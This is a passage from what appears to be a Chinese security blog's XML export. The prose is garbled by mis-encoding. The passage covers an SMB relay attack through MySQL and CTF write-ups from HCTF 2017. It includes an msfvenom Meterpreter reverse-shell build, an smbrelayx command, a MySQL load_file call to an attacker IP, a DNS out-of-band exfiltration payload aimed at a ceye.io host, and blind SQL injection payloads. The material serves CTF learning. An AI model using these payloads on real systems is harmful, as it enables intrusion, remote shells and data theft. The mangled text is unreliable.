<h2 id="0x05-SMBä¸­ç»§æ”»å‡»"><a href="#0x05-SMBä¸­ç»§æ”»å‡»" class="headerlink" title="0x05 SMBä¸­ç»§æ”»å‡»"></a>0x05 SMBä¸­ç»§æ”»å‡»</h2><p>è¿™ä¸ªæ”»å‡»æ–¹å¼ä¸»è¦æ˜¯åˆ©ç”¨mysqlæœåŠ¡å™¨é€šè¿‡load_fileã€into outfile/dumpfileã€load data infileç­‰å‡½æ•°å‘ä¸»æœºè¿æ¥é€šä¿¡çš„æ—¶å€™ï¼ˆæè¿°ä¸ä¸€å®šå‡†ç¡®ï¼‰ï¼Œä½¿ç”¨smbrelayxç­‰å·¥å…·å°†åå‘shellä¸Šä¼ åˆ°ä¸»æœºä¸­ã€‚smbrelayxå·¥å…·ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/coresecurity/impacket" target="_blank" rel="noopener">https://github.com/coresecurity/impacket</a><br>åˆ©ç”¨kailiç”Ÿæˆåå‘è¿æ¥shellï¼ˆwin7ç¯å¢ƒï¼‰ï¼š</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">172.20</span>.<span class="number">10.5</span> LPORT=<span class="number">443</span>  -f exe &gt; win64.exe</span><br></pre></td></tr></table></figure>
<p>å¯ç”¨smbrelayx.py</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">smbrelayx.py -h [æ”»å‡»ä¸»æœºip] -e ./win64.exe</span><br></pre></td></tr></table></figure>
<p>Metasploitä¸Šå¯ç”¨multi/handleræ¨¡å—ï¼Œè®¾ç½®å¥½payloadï¼Œlhostï¼Œlportï¼Œåœ¨MySQLæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">select load_file(<span class="string">'\\\\172.20.10.5\\test'</span>);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>å³å¯å‘èµ·smbä¸­ç»§æ”»å‡»ï¼Œä»è€Œåå‘Getshellï¼Œç”±äºMySQLç‰ˆæœ¬çš„åŸå› ï¼Œæ­¤æ”»å‡»åˆ©ç”¨ç‡è¾ƒä½ï¼Œä¸è¿‡ä¹Ÿä¸ä¹æœ‰å°‘æ•°ç®¡ç†å‘˜å°†secure_file_privå˜é‡å¼€å¯åˆ©ç”¨ï¼Œæˆ–è€…MySQLæ²¡æœ‰åŠæ—¶æ›´æ–°å‡çº§ã€‚</p>
<h2 id="0x06-å‚è€ƒæ–‡ç« "><a href="#0x06-å‚è€ƒæ–‡ç« " class="headerlink" title="0x06 å‚è€ƒæ–‡ç« "></a>0x06 å‚è€ƒæ–‡ç« </h2><p><a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="noopener">Osanda Malith Jayathissa</a></p>
<p><strong>æ–‡ç« åªç”¨äºä¸ªäººå­¦ä¹ è®°å½•</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>Out-of-Band</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸¤å¤©åšäº†HCTFçš„æœ€ç®€å•çš„é¢˜</title>
    <url>/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<h3 id="0x00-poker2"><a href="#0x00-poker2" class="headerlink" title="0x00 poker2"></a>0x00 poker2</h3><p>è¿™ä¸¤å¤©çœŸçš„æ˜¯æ²‰è¿·æ¸¸æˆï¼Œä¸èƒ½è‡ªæ‹”ï¼Œåˆšå¼€å§‹è¿›å…¥æ¸¸æˆçš„æ—¶å€™ï¼Œå‘ç°åŒç›®å½•æœ‰flag.phpï¼Œè¦æ±‚æ¸¸æˆå‡åˆ°100çº§ï¼Œå°±å¯ä»¥å¾—åˆ°flagï¼Œé‚£å°±æ˜¯åˆ·çº§äº†ï¼Œç»“æœä¸€æ³¨å†Œï¼Œå‘ç°é€äº†æˆé•¿ç¤¼åŒ…ï¼ˆåæ¥æ‰å‘ç°åŸæ¥å…¶ä»–äººæ²¡æœ‰ï¼‰ï¼Œç›´æ¥é£™åˆ°90çº§ï¼Œå æ®å…¨æœç¬¬ä¸€çš„ä½ç½®ä¸€ä¸ªä¸Šåˆã€‚è¿™é¢˜å°±æ˜¯æŠ“åŒ…é‡å¤åˆ·æ€ªå°±å¥½äº†ï¼ŒåªçŸ¥é“åœ£è¯å°å±‹ç»éªŒé«˜ã€‚è¿™é‡Œç›´æ¥è´´è„šæœ¬äº†</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-2249f408b45e1c33.png" alt></p>
<p>ç®€å•çš„åˆ·åˆ†è„šæœ¬                                        </p>
<p>åˆ°äº†100çº§ååˆ°flag.phpå°±ç›´æ¥å¾—åˆ°flagï¼šhctf{Go0dLuck_toGetTheFl3g__from_game}</p>
<p><strong>boring website</strong></p>
<p>æ‰«æå‘ç°æœ‰<a href="http://www.zipï¼Œé‡Œé¢æœ‰index.phpçš„æºç " target="_blank" rel="noopener">www.zipï¼Œé‡Œé¢æœ‰index.phpçš„æºç </a></p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-3cf59e70e00511d7.png" alt>                                   </p>
<p>æ³¨å…¥ç‚¹å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯åœ¨å‚æ•°idé‚£ï¼Œæ•°æ®åº“å¯†ç  â€˜oobâ€™ æç¤ºè¿™é“é¢˜æ˜¯MySQL Out-of-Bandæ”»å‡»ï¼Œå†åŠ ä¸Šæ³¨é‡Šçš„ //link server: On  linkname:mysqlï¼Œç›®æ ‡æ•°æ®åº“æ˜¯SQL Serverçš„ï¼Œæ‰€ä»¥è¿™é‡Œè¦ç”¨åˆ°OpenQueryè¡¨è¾¾å¼ï¼šOPENQUERY (  linked_server ,â€™queryâ€™ )ï¼Œç”±äºè¿‡æ»¤äº†æ•æ„Ÿå­—ç¬¦ï¼Œæ²¡æ³•å¾—åˆ°å›æ˜¾ï¼Œä¸»è¦å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="http://bobao.360.cn/learning/detail/3458.htmlï¼Œå‘ç°å¯ä»¥åˆ©ç”¨DNSè§£ææå–æ•°æ®ï¼Œä¾‹å¦‚ï¼šselect" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3458.htmlï¼Œå‘ç°å¯ä»¥åˆ©ç”¨DNSè§£ææå–æ•°æ®ï¼Œä¾‹å¦‚ï¼šselect</a>  load_file(concat(â€˜\â€™,version(),â€™.hacker.site\a.txtâ€™));æ‰€ä»¥æ„é€ payloadï¼šid=1; select * from OpenQuery(mysql,â€™SELECT LOAD_FILE(CONCAT(â€œ\â€,(select  1),â€.mysql.ip.port.8cs2vs.ceye.io\abcâ€))â€™);</p>
<p>åœ¨DNSè§£æå¹³å°å¯ä»¥å¾—åˆ°åé¦ˆæ•°æ®ï¼Œé‚£ä¹ˆå°±ä¸‹æ¥å°±æ˜¯æŠŠ(select 1)æ”¹æˆæŸ¥åº“ï¼ŒæŸ¥è¡¨ï¼ŒæŸ¥å­—æ®µ/å†…å®¹çš„è¯­å¥å°±å¥½äº†,ä¸»è¦è¿˜æ˜¯å­¦ä¹ äº†oobæ”»å‡»ä¸€æ³¢ï¼Œè¿™é‡Œç›´æ¥è´´å›¾ï¼š</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-e8fd0904e57cdc6f.png" alt></p>
<p>å¾—åˆ°flagï¼šhctf{dn5-1og-can-take-f14g-6as84f}</p>
<h3 id="0x01-poker-poker"><a href="#0x01-poker-poker" class="headerlink" title="0x01 poker-poker"></a>0x01 poker-poker</h3><p>æ‰“å¼€å‘ç°å’Œlevel 2é‡Œçš„poker2æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯ä¸€é“é¢˜ä¸¤ä¸ªflagï¼Œåœ¨åšlevel 2  çš„æ—¶å€™ï¼Œå°±å°è¯•è¿‡å¾ˆå¤šæ–¹æ³•ï¼ŒæŠ“åŒ…çš„æ—¶å€™å‘ç°å¸¦æœ‰å¾ˆå¤šå‚æ•°ï¼Œæ‰€ä»¥æŠŠåŒ…åç”©sqlmapé‡Œè·‘äº†ä¸€ä¸‹ï¼Œåœ¨æ³¨å†Œå¤„çš„åŒ…æœ‰æŠ¥å­˜åœ¨æ³¨å…¥ï¼Œä½†æ˜¯sqlmapéƒ½æ²¡æ³•è·‘å‡ºæ¥ï¼Œå¸¦ç€æµ‹è¯•ä¸€æ³¢çš„å¿ƒç†å¼€å§‹æ‰‹åŠ¨æµ‹è¯•ï¼Œå‘ç°usernameå‚æ•°å¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥æ„é€ payloadï¼š</p>
<p>?bc=2&amp;bname=easdasd&amp;head=6&amp;pass=&amp;sex=2&amp;username= â€™ and if( (ascii(substr((select database()),1))&gt;97),sleep(5)1)â€“+</p>
<p>å‘ç°ä¸ä»…å¯ä»¥æ—¶é—´ï¼Œè¿˜å¯ä»¥ç›´æ¥åˆ¤æ–­è¿”å›å€¼æ¥æ³¨ï¼Œå¯ä»¥æ„é€ payloadï¼š</p>
<p>?bc=2&amp;bname=easdasd&amp;head=6&amp;pass=&amp;sex=2&amp;username=11111 â€™ and if( (ascii(substr((select database()),1))&gt;97),0,1)â€“+  è¿›è¡Œæ³¨å…¥ï¼ˆè¿™æ ·å†™è„šæœ¬æ–¹ä¾¿ç‚¹ï¼‰</p>
<p>è¿™é‡Œå¿…é¡»è¡¥å……å†™ä¸‹ï¼Œç›´æ¥æŸ¥åº“æ˜¯pm_hctfï¼ŒæŸ¥åˆ°ç¬¬ä¸€ä¸ªè¡¨æ˜¯PasswordProtection</p>
<p>çœ‹åˆ°é¢˜ç›®æ˜¯çš„psptï¼Œå¿ƒé‡Œæœ‰ç‚¹å°é«˜å…´ï¼Œç»“æœèŠ±äº†å¥½å‡ ä¸ªå°æ—¶ï¼ŒæŠŠpm_hctfåº“ä¸‹100å¤šä¸ªè¡¨åéƒ½çœ‹äº†ä¸€éï¼Œå‘ç°æ²¡æœ‰å’Œflagæœ‰å…³çš„å•Šï¼Œæœ€åé‡æ–°æŸ¥äº†ä¸‹å…¶ä»–åº“ï¼Œæœ‰ä¸ªhctfï¼Œflag2è¡¨ï¼ŒçœŸçš„æ˜¯ä¸€æŠŠå¹¸é…¸æ³ªå•Šï¼Œç›´æ¥è´´è„šæœ¬ï¼š</p>
<p><img src="/2017/11/12/%E4%B8%A4%E5%A4%A9%E5%81%9A%E4%BA%86HCTF%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A2%98/8418106-dcb4fcdd43d1eead.png" alt>                                      </p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-401387e4b93a4c11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>å¾—åˆ°flagï¼šhctf{y3u_G0t_tHe__poker_game}</p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>é€»è¾‘</tag>
      </tags>
  </entry>
</search>
